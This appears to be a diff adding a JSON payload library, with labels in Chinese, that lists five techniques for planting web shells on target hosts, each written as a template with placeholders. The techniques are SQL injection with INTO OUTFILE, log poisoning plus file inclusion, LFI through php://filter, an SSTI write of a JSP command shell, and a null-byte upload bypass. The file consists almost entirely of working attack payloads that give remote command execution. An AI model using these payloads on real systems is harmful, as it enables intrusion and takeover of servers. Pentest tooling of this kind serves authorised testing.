@@ -1,0 +1,37 @@
+[
+  {
+    "id": "i-1",
+    "title": "SQL 注入写马",
+    "scene": "MySQL",
+    "hostId": "h-l1-01",
+    "payload": "-- 目标：{URL}  参数：{PARAM}\n-- 前置条件：secure_file_priv 为空或指向可写目录\n' UNION SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '{PATH}{FILE}'-- -\n-- 落盘后访问：http://{IP}/{FILE}"
+  },
+  {
+    "id": "i-2",
+    "title": "日志写马",
+    "scene": "MySQL / Apache",
+    "hostId": "h-l1-01",
+    "payload": "# 1) 把马写进查询日志（目标 {IP} · {HOST}）\nSELECT '<?php @eval($_POST[cmd]);?>';\n# 2) 再通过文件包含执行日志\ncurl 'http://{IP}/index.php?file=/var/log/mysql/error.log'"
+  },
+  {
+    "id": "i-3",
+    "title": "文件包含写马",
+    "scene": "LFI",
+    "hostId": "h-l1-01",
+    "payload": "# 1) 先上传含 base64 载荷的图片到 {PATH}\n# 2) 再包含并解码\nhttp://{IP}/index.php?file=php://filter/convert.base64-decode/resource={PATH}tmp.png\n# 3) 访问落盘后的马：http://{IP}/{FILE}"
+  },
+  {
+    "id": "i-4",
+    "title": "模板注入写马",
+    "scene": "SSTI",
+    "hostId": "h-l2-01",
+    "payload": "# 目标 {URL}\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('{PATH}{FILE}','w').write('<%@ page import=\"java.io.*\" %><%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>') }}\n# 验证：http://{IP}:8080/{FILE}?cmd=id"
+  },
+  {
+    "id": "i-5",
+    "title": "上传绕过写马",
+    "scene": "上传",
+    "hostId": "h-l1-02",
+    "payload": "POST {URL} HTTP/1.1\nHost: {IP}\nContent-Type: multipart/form-data; boundary=----x\n------x\nContent-Disposition: form-data; name=\"file\"; filename=\"{FILE}%00.jpg\"\nContent-Type: image/jpeg\n\n<GIF89a><?php @eval($_POST[cmd]);?>\n------x--\n# 落盘路径：{PATH}{FILE}"
+  }
+]
